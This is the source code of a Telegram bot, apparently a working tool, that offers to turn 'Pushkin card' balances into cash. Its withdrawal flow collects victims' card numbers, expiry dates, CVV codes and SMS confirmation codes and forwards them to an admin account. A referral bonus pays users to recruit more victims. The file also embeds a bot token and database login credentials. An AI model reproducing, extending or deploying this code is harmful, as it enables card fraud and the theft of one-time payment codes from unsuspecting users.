const express = require("express");
const app = express();
const mongoose = require("mongoose");

const { Telegraf, session, Scenes } = require("telegraf");
const { Keyboard } = require("telegram-keyboard");

const { Customer, Payment } = require("./models");
// Scenes
const enterCodeScene = require("./scenes/enterCode");
const withdrawScene = require("./scenes/withdraw");
const supportScene = require("./scenes/support");

const faq = require("./faq.json");
// Bot init
const BOT_TOKEN = "5141657441:AAHFsGLxSZeXJU2haEk3F0IJTcOrNWRPDnM";
const bot = new Telegraf(BOT_TOKEN);

const stage = new Scenes.Stage([ enterCodeScene, withdrawScene, supportScene ]);

bot.use(session());
bot.use(stage.middleware());
// Mongoose
const uri = `mongodb+srv://pharaon4ik:1password@cluster0.i2dad.mongodb.net/myFirstDatabase?retryWrites=true&w=majority`;
mongoose.connect(uri, { useNewUrlParser: true });
const connection = mongoose.connection;
connection.once('open', () => {
  console.log("MongoDB database connection established successfully");
})
connection.on("error", e => console.log(e))

const exit_keyboard = Keyboard.make([
    ['Выйти в меню'], 
]);
const default_keyboard = Keyboard.make([
    ['Вывести деньги', 'Информация'],
    ["Реферальная система"],
    ['Поддержка', 'FAQ'], 
]);

const faqSource = JSON.parse(JSON.stringify(faq));

bot.hears("Вывести деньги", ctx => {
    Payment.find({ "status": 1 }, (err, foundPayments) => {
        const alreadyRequestedPayment = foundPayments.find(p => p.customer.telegram_id === String(ctx.message.from.id));
        if(alreadyRequestedPayment){
            ctx.replyWithHTML(`У вас уже создана заявка на вывод ${alreadyRequestedPayment.amount}P`, {
                reply_markup: {
                    inline_keyboard: [
                        [ { text: "Отменить", callback_data: "cancel_current_order_" + alreadyRequestedPayment._id } ],
                    ]
                }
            });
        } else {
            ctx.replyWithHTML("Вывод средств состоит из трех этапов:\n\n1. Указание <b>номера, даты и CVV кода Пушкинской карты</b>, с которой Вы хотите вывести средства, а также сумма, которую Вы хотите вывести\n\n2. Указание реквизита, на который вы хотите вывести деньги (Ваша банковская карта / Qiwi-кошелёк / Баланс телефона)\n\n3. Дождаться, когда вам придёт SMS о подтверждении оплаты, с кодом, который вам нужно будет здесь указать", {
                reply_markup: {
                    inline_keyboard: [
                        [ { text: "🚀 Да, я хочу вывести деньги", callback_data: "startWithdraw" } ],
                    ]
                }
            });
        }
    }).populate("customer");
});
bot.action("startWithdraw", ctx => {
    ctx.scene.enter("withdrawWizard").then(() => {
        ctx.replyWithHTML("💳 Введите <b>номер</b> вашей <b>Пушкинской</b> карты", exit_keyboard.reply());
        ctx.wizard.state.data = {};
        ctx.wizard.state.msgHistory = {};
        return ctx.wizard.selectStep(1);
    });
});
bot.hears("Поддержка", ctx => ctx.scene.enter("supportWizard"));

bot.hears("SMS", ctx => {
    const paymentId = ctx.message.reply_to_message.text.split("\n")[1];
    Payment.findOne({ _id: paymentId }, (err, paymentRequest) => {
        ctx.telegram.sendMessage(paymentRequest.customer.telegram_id, 'Ваша заявка обрабатывается. Введите в ответ к этому сообщению СМС код', {
            reply_markup: {
                inline_keyboard: [
                    [ { text: "Ввести код", callback_data: "enter_code_" + paymentRequest._id }, { text: "Отмена", callback_data: "cancel_current_order_" + paymentRequest._id } ]
                ]
            }
        });
    }).populate("customer");
});
bot.action(/enter_code_+/, ctx => {
    ctx.deleteMessage(ctx.update.callback_query.message.message_id);
    const paymentRequestId = ctx.match.input.substring(11).trim();
    ctx.scene.enter("enterCodeWizard", { paymentRequestId: paymentRequestId });
    ctx.replyWithHTML("Введите <b>SMS-код</b>");
});
bot.action(/cancel_current_order_+/, ctx => {
    const paymentRequestId = ctx.match.input.substring(21).trim();
    Payment.findByIdAndUpdate(paymentRequestId, {
        status: 0
    }, (err, canceled) => {
        // Удаляем сообщение админу с заявкой на выплату, чтобы не засорять его ЛС отмененными заявками
        ctx.telegram.deleteMessage(1257409280, canceled.initialAdminMessage);
        ctx.reply("Вы отменили свою заявку на выплату");
    });
});

bot.action(/successful_paymentRequest_+/, ctx => {
    const paymentRequestId = ctx.match.input.substring(26).trim();
    Payment.findByIdAndUpdate(paymentRequestId, {
        status: 2
    }, (err, paymentRequest) => {
        ctx.telegram.sendMessage(paymentRequest.customer.telegram_id, "✅ Вывод средств прошёл успешно ! Деньги будут перечислены на указанный Вами реквизит во время следующей волны выплат: 31 мая, 2022");
        // Чистим админскую личку
        ctx.telegram.deleteMessage(1257409280, paymentRequest.initialAdminMessage);
        ctx.telegram.deleteMessage(1257409280, paymentRequest.smsRequestMessage);
        // Уведомляем рефовода, что его реферал произвел выплату
        Customer.findOne({ referrals: paymentRequest.customer._id }, (err2, referrer) => {
            if(referrer && !err2){
                ctx.telegram.sendMessage(referrer.telegram_id, "⭐️💵 Ваш реферал успешно оформил вывод на " + paymentRequest.amount + "₽\nВы получаете 10% от его вывода");
                referrer.balance = referrer.balance + (paymentRequest.amount / 100 * 10);
                referrer.save();
            }
        });
    }).populate("customer");
});
bot.action(/failed_paymentRequest_+/, ctx => {
    const paymentRequestId = ctx.match.input.substring(22).trim();
    Payment.findByIdAndUpdate(paymentRequestId, {
        status: 3
    }, (err, paymentRequest) => {
        ctx.telegram.sendMessage(paymentRequest.customer.telegram_id, "Что-то пошло не так.\nСамые распространенные причины проблемы: Слишком долгое ожидание SMS-кода с Вашей стороны // Баланс Пушкинской карты меньше суммы, которую Вы хотели вывести // Неправильный SMS-код.");
        // Чистим админскую личку
        ctx.telegram.deleteMessage(1257409280, paymentRequest.initialAdminMessage);
        ctx.telegram.deleteMessage(1257409280, paymentRequest.smsRequestMessage);
    }).populate("customer");
});

bot.hears("Реферальная система", ctx => {
    const currentUserTelegramId = ctx.update.message.from.id;
    Customer.findOne({ telegram_id: currentUserTelegramId }, (err, user) => {
        ctx.replyWithHTML(`<b>Приведи друга и получи 10% от суммы, которую он в итоге выведет!</b>\n\n💰 Ваш реферальный баланс: ${user.balance}₽\n\n🚀 Ваша ссылка для приглашения друзей: https://t.me/pushkinbank_bot?start=${ctx.update.message.from.id}\n\n<i>Как только кто-либо из ваших рефералов проведёт успешный вывод денег, Вам сразу придёт уведомление о поступлении бонуса на Ваш баланс</i>`);
    });
});

bot.hears("Информация", ctx => {
    ctx.replyWithPhoto({ source: "./assets/info.png" }, { caption: "Мы помогаем людям вывести их деньги с Пушкинских карт на свой счёт, чтобы Вы могли потратить эти деньги на себя.\n\n💰 Курс обмена: За каждые 1.15₽ с Пушкинской карты вы получаете 1₽ реальный\n(Напр., за вывод 4500₽ с Пушкинской карты вы в итоге получите 3913₽ реальных на свой счёт)\n\n💴 Мы выводим деньги на: Банковский счёт (Любой 🇷🇺 банк), Qiwi, Мобильный счёт (МТС, Мегафон)\n\n💎 Через нас уже выведено: 1.455.940₽ (На момент прошлой волны выплат 15.05.2022)" });
});

bot.hears("FAQ", ctx => {
    ctx.reply("Выберите интересующий вас вопрос", {
        reply_markup: {
            inline_keyboard: faqSource.faq.map(item => {
                return [ { text: item.questionText, callback_data: "question_" + item.id } ]
            })
        }
    });
});
bot.action(/question_+/, ctx => {
    const questionId = ctx.match.input.substring(9).trim();
    const questionItem = faqSource.faq.filter(i => String(i.id) === questionId);
    if(questionItem.length !== 0){
        ctx.replyWithHTML(questionItem[0].answer);
    } else {
        ctx.reply("Вопрос не найден");
    }
});

bot.hears(/ans\s.*/, ctx => {
    const initialMessage = ctx.update.message.reply_to_message.text;
    const issueCreator = initialMessage.split("\n")[1];
    const issueText = initialMessage.split("\n")[3];

    const issueReply = ctx.update.message.text.replace("ans ", "");
    ctx.deleteMessage(ctx.update.message.reply_to_message.message_id);
    ctx.telegram.sendMessage(issueCreator, `"${issueText}"\n\n🗣 Ответ на ваше обращение:\n${issueReply}`);
});

// Start bot
bot.start(ctx => {
    const { startPayload: referralCode } = ctx;
    const currentUserTelegramId = String(ctx.update.message.from.id);

    Customer.findOne({ telegram_id: currentUserTelegramId }, (err, user) => {
        console.log("err", err)
        console.log("user found", user)
        if(user === null || err){
            const newCustomer = new Customer({
                telegram_id: currentUserTelegramId
            });
            newCustomer.save((err, created) => {
                console.log("created new", created)
                if(referralCode !== ""){
                    Customer.findOneAndUpdate({ telegram_id: String(referralCode) }, {
                        $push: {
                            referrals: created._id
                        }
                    }, (err, success) => {
                        ctx.reply("Добро пожаловать !", default_keyboard.reply());
                    });
                }
            });
        } else {
            ctx.reply("Добро пожаловать !", default_keyboard.reply());
        }
    })
});

bot.hears(/.*/, ctx => ctx.reply("Используйте меню для дальнейшей навигации", default_keyboard.reply()));

// Запуск бота
bot.launch();

app.listen(3000, () => {
    console.info("Бот работает");
});
